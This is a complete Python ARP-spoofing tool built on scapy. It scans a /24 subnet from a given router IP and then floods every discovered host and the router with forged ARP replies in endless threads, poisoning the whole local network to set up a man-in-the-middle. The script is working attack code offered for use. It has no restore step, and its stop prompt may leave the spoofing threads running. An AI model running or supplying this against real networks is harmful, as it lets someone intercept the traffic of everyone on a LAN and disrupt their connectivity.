import time
from os import system
from sys import platform, exit
import scapy.all as scapy
from threading import Thread

def clear():
    if platform == "win32":
        system("cls")
    else:
        system("clear")


class NetworkDevice():
    def __init__(self, ip) -> None:
        self.ip = ip
        self.mac = self.__get_mac()
        if self.mac != "":
            print(f"Found at {self.ip}")

    def __get_mac(self):
        packet = scapy.Ether(dst="ff:ff:ff:ff:ff:ff") / scapy.ARP(pdst=self.ip, op=1)
        try:
            return scapy.srp(packet, timeout=0.5, verbose=0)[0][0][1].hwsrc
        except:
            return ""
    
    def __str__(self):
        return f"{self.ip} <-> {self.mac}"


class ArpSpoofer():
    def __init__(self, router:NetworkDevice, target:NetworkDevice) -> None:
        self.router = router
        self.target = target
            
    def spoof(self):
        a1 = scapy.ARP(pdst=self.target.ip, psrc=self.router.ip, hwdst=self.target.mac, op=2)
        a2 = scapy.ARP(pdst=self.router.ip, psrc=self.target.ip, hwdst=self.router.mac, op=2)
        scapy.send(a1, verbose=0)
        scapy.send(a2, verbose=0)

    def exec(self):
        while True:
            self.spoof()

def main():
    router_ip = input("[?] Router IP >> ")
    network_ip_arr = router_ip.split(".")
    network_ip = ""
    for i in range(len(network_ip_arr) -1):
        network_ip += network_ip_arr[i]+"."
    clear()
    print(f"Found network IP: {network_ip}0/24")
    time.sleep(2)
    clear()
    targets = []
    print("Scannig hosts...")
    for i in range(2, 255):
        target_ip = network_ip+str(i)
        target = NetworkDevice(target_ip)
        if target.mac != "":
            targets.append(target)
    router = NetworkDevice(router_ip)
    threads = []
    for target in targets:
        print(f"Running arp spoof for {str(target)} in a thread.")
        x = ArpSpoofer(router, target)
        Thread(target=x.exec).start()
    
    print("All devices in your network now poisend")
    input("Press enter to stop MITM and close...")
    exit(0)

if __name__ == "__main__":
    main()
